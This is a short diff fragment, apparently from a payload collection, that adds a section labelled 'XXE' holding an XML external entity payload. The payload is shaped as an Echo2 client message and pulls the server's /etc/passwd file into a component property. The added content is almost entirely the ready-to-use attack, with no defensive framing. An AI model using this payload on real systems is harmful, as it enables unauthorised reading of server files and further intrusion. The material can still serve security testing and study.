@@ -60,3 +60,13 @@ Adjust as Needed:
          </script>
      </body>
  </html>
+ 
+
+4. XXE 
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<client-message xmlns="http://www.karora.org/products/echo2/cli-msg">
+  <message-part xmlns:processor="EchoPropertyUpdate">
+    <property component-id="c_11" name="text">&xxe;</property>
+  </message-part>
+</client-message>
